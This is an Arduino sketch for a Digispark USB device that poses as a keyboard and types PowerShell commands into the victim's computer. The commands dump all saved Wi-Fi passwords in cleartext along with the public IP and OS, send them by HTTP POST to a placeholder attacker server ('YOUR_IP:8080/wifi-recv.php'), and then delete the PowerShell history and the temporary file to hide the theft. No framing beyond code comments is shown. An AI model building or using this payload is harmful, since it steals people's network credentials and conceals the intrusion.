#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT);  // onboard LED
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);

  // Open PowerShell from Win+R
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(150);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600); // wait for PS window to be ready

  // 1) $csvPath = "$env:TEMP\temp.csv"
  DigiKeyboard.print(
    F("$csvPath = \"$env:TEMP\\temp.csv\"")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(150);

  // 1b) $ip and $os
  DigiKeyboard.print(
    F("$ip = (Invoke-RestMethod -Uri \"https://api.ipify.org?format=json\").ip")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);

  DigiKeyboard.print(
    F("$os = (Get-CimInstance Win32_OperatingSystem).Caption")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);

  // 2) (netsh wlan show profiles) | ... | Export-Csv $csvPath -NoTypeInformation
  DigiKeyboard.print(
    F("(netsh wlan show profiles) | "
      "Select-String '\\:(.+)$' | "
      "% { $name = $_.Matches.Groups[1].Value.Trim(); $_ } | "
      "% { netsh wlan show profile name=$name key=clear } | "
      "Select-String 'Key Content\\W+\\:(.+)$' | "
      "% { $pass = $_.Matches.Groups[1].Value.Trim(); $_ } | "
      "% { [PSCustomObject]@{ profile_name = $name; password = $pass; ip = $ip; os = $os } } | "
      "Export-Csv $csvPath -NoTypeInformation")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000); // allow netsh + Export-Csv to finish

  // 3) $b = Get-Content $csvPath -Raw
  DigiKeyboard.print(
    F("$b = Get-Content $csvPath -Raw")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);

  // 4) Invoke-WebRequest ... -Body $b
  DigiKeyboard.print(
    F("Invoke-WebRequest -UseBasicParsing -Uri 'http://YOUR_IP:8080/wifi-recv.php' -Method POST -Body $b")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500); // allow HTTP + PHP

  // 5) del (Get-PSReadlineOption).HistorySavePath
  DigiKeyboard.print(
    F("del (Get-PSReadlineOption).HistorySavePath")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);

  // 6) Remove-Item $csvPath ... and exit
  DigiKeyboard.print(
    F("Remove-Item $csvPath -ErrorAction SilentlyContinue")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);

  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // 7) Blink LED forever to signal completion
  while (true) {
    digitalWrite(1, HIGH);
    DigiKeyboard.delay(200);
    digitalWrite(1, LOW);
    DigiKeyboard.delay(200);
  }
}
